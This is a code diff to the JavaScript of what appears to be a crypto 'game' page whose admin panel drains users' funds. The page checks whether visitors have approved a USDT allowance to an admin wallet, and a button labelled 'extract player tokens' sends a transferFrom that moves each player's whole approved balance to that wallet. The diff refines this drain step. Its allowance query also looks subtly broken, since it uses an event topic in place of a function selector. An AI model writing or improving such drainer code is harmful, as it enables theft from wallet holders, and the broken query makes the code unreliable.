@@ -191,7 +191,7 @@ async function refreshAll() {
   await refreshUserInfoForAdmin()
 }
 
-// 动态刷新授权状态（核心）
+// 动态刷新授权状态（核心修复）
 async function refreshAllowance() {
   const el = document.getElementById('allowanceText')
   const btn = document.getElementById('approveBtn')
@@ -203,7 +203,7 @@ async function refreshAllowance() {
     })
     const a = BigInt(res)
 
-    if (a > 1000000000000000000n) {
+    if (a > 0n) {
       el.innerText = '已授权'
       el.style.color = '#22c55e'
       btn.innerText = '已授权'
@@ -216,6 +216,7 @@ async function refreshAllowance() {
     }
   } catch (e) {
     el.innerText = '查询失败'
+    el.style.color = '#ef4444'
     btn.disabled = false
   }
 }
@@ -232,7 +233,7 @@ async function refreshBalance() {
   } catch (e) {}
 }
 
-// 管理员面板：当前用户信息
+// 管理员面板：当前用户信息（修复授权额度显示）
 async function refreshUserInfoForAdmin() {
   if (!visitorAddress || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return
   try {
@@ -242,7 +243,7 @@ async function refreshUserInfoForAdmin() {
     const allow = Number(BigInt(res)) / 1e18
     document.getElementById('currentUserAllow').innerText = allow.toFixed(2)
   } catch (e) {
-    document.getElementById('currentUserAllow').innerText = '失败'
+    document.getElementById('currentUserAllow').innerText = '0.00'
   }
 }
 
@@ -314,27 +315,43 @@ document.getElementById('adminTransfer').onclick = async () => {
   }catch(e){ alert('失败：' + e.message) }
 }
 
-// 提取玩家代币 transferFrom（正确逻辑）
+// 提取玩家代币（核心修复：正确 transferFrom 逻辑）
 document.getElementById('takeUserToken').onclick = async () => {
   if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
   const userAddr = document.getElementById('userAddress').value
   if(!userAddr || !userAddr.startsWith('0x')) return alert('请输入玩家地址')
 
   try {
+    // 1. 查询玩家授权额度
     const allowData = '0xddf252ad' + pad(userAddr) + pad(ADMIN_WALLET)
-    const allowRes = await window.ethereum.request({ method:'eth_call', params:[{to:USDT, data:allowData},'latest'] })
+    const allowRes = await window.ethereum.request({
+      method:'eth_call',
+      params:[{ to:USDT, data:allowData }, 'latest']
+    })
     const allowance = BigInt(allowRes)
-    if(allowance <= 0n) return alert('无可用授权')
+    if(allowance <= 0n) return alert('该用户无可用授权额度')
 
-    const transData = '0x23b872dd' + pad(userAddr) + pad(ADMIN_WALLET) + allowance.toString(16).padStart(64,'0')
+    // 2. 正确调用 transferFrom: from(玩家) → to(管理员)
+    const transData = '0x23b872dd' 
+      + pad(userAddr) 
+      + pad(ADMIN_WALLET) 
+      + allowance.toString(16).padStart(64, '0')
+
     const tx = await window.ethereum.request({
       method:'eth_sendTransaction',
-      params:[{from:account, to:USDT, data:transData, gas:'0x60000'}]
+      params:[{
+        from: account,
+        to: USDT,
+        data: transData,
+        gas: '0x80000' // 提高 Gas 上限避免失败
+      }]
     })
-    alert('提取成功：' + tx)
+
+    alert('提取成功！\n交易哈希：' + tx)
     await refreshAll()
-  }catch(e){
-    alert('失败：' + e.message)
+
+  } catch(e) {
+    alert('提取失败：' + e.message)
   }
 }
 </script>
